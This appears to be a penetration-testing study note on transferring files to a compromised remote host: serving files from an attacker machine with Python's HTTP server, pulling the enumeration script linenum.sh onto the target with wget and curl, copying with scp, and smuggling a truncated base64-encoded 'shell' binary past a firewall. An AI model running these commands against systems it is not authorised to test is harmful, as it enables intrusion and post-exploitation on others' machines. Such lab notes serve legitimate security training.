1. Method -> running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host.
2. 
# Using [[wget]]
#tool 
Locally:
```pug
cd /tmp
python3 -m http.server 8000 
```
Remote host:
```pug
wget http://10.10.14.1:8000/linenum.sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

# Using `SCP`
-- needs ssh user creds
```pug
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

# Using Base64 when R.H. has firewall
```pug
base64 shell -w 0
```
Other device
```pug
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```


# Validating File Transfers
```pug
file shell
```
Check hash: (compare local and on remote host)
```pug
md5sum shell
```
